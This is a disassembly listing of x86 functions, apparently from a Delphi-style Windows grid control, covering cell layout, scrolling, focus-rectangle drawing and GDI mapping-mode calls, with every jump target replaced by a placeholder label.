lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_471db0
pop ecx
mov eax [ ebp - 0x10 ]
call sub_471bb0
mov eax [ ebp - 0x8 ]
call sub_471bb0
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_475868
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_471e40
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_471e40
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_471e40
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_471e40
pop ecx
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_423c94
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_41919c
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4240b4
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_423c94
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_41919c
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_4240b4
mov eax [ ebx ]
mov si 0xffb5
call sub_403450
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_472ca0
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_475868
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_4735dc
mov eax [ ebx ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424038
jmp r-xdata
sub_472670
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_4726d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4499bc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4499bc
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_472758
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4726d8
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_472670
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_472670
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4727b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449a00
push eax
mov eax ebx
call sub_4499bc
mov ecx eax
mov edx esi
mov eax ebx
call sub_472838
pop esi
pop ebx
retn
sub_4727d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_472838
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_4728f4
mov eax ebx
mov edx esi
call sub_4727d8
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_4727d8
pop esi
pop ebx
pop ebp
retn 0x4
sub_472864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_4728f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_475828
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_472864
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_475848
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_472864
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_472978
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_4729ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_472978
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_472978
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_472a1c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4499bc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_472b34
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4499bc
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_472b80
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4499bc
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_472bcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_449a00
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_472b34
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_472b80
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_472a1c
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_472a1c
pop ecx
sub_472ca0
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_419174
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_419174
push 0x8
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_449a00
push eax
mov eax ebx
call sub_4499bc
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_449a00
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_4499bc
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetWindowExtEx
mov eax ebx
call sub_4499bc
mov ecx esp
xor edx edx
call sub_419174
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_419174
push 0x8
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_449a00
push eax
mov eax ebx
call sub_4499bc
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_449a00
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_4499bc
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_424598
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_472df4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_42b204
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4715c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472e60
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_470704
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_470704
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
add eax 0x250
call sub_470704
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_473e20
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_473d98
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_473750
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_474760
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_403450
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_450adc
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_4727b4
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_472df4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_472df4
pop ecx
sub_473008
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4727b4
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push j_sub_4036f4#4
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_472e60
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4730e0
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_4727b4
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_4729ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_4742b4
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_4731a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423800
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4732da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_423a90
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_423a74
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_423ac0
xor eax eax
push ebp
push sub_4732bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42418c
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_42412c
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42418c
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_42412c
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42418c
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_42412c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
